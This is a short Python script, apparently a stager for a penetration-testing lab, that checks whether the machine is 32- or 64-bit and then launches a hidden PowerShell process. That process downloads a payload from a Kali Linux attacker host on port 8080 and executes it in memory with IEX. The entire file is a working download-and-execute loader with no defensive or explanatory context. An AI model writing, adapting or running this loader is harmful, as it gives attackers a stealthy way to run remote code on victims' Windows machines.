import platform, subprocess

IP = 'http://IP_do_Kali_Linux:8080' #1

if '64' in platform.machine(): #2
    powershell = "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('" + IP + "/64bits'))" #3
else:
    powershell = "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('" + IP + "/32bits'))" #4

subprocess.Popen(powershell, shell=True) #5